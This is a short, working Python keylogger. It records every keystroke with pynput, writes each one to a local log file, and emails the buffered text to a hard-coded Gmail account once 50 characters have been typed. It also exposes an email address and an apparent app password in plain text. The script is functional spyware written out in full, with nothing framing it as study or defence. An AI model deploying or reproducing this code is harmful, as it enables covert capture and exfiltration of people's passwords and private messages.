from pynput import keyboard
import yagmail

# --- Configuration ---
LOG_FILE = "typed_keys.txt"
EMAIL_ADDRESS = "minerhossainrimon1033@gmail.com"
EMAIL_PASSWORD = "nondzougpscwzjhn"
RECIPIENT = "minerhossainrimon1033@gmail.com"

# --- Buffer to store typed keys ---
key_buffer = []

# --- Function to send email ---
def report_via_email(message):
    try:
        print("Attempting to send email...")
        yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
        yag.send(to=RECIPIENT, subject="Keylogger Report", contents=message)
        print("Email sent successfully with content:\n", message)
    except Exception as e:
        print("Failed to send email:", e)

# --- Callback for key press ---
def handle_key_press(key):
    global key_buffer
    try:
        key_buffer.append(key.char)
        print(f"Key pressed: {key.char}")
    except AttributeError:
        key_buffer.append(f"[{key}]")
        print(f"Special key pressed: {key}")

    # Write the latest key to file
    with open(LOG_FILE, "a") as f:
        f.write(key_buffer[-1])

    # Print buffer length
    print("Buffer length:", len(''.join(key_buffer)))

    # If buffer reaches 50 chars, send email and clear buffer
    if len(''.join(key_buffer)) >= 50:
        report_via_email(''.join(key_buffer))
        key_buffer.clear()

# --- Start keylogger ---
print("Keylogger started. Type at least 50 characters...")
with keyboard.Listener(on_press=handle_key_press) as listener:
    listener.join()

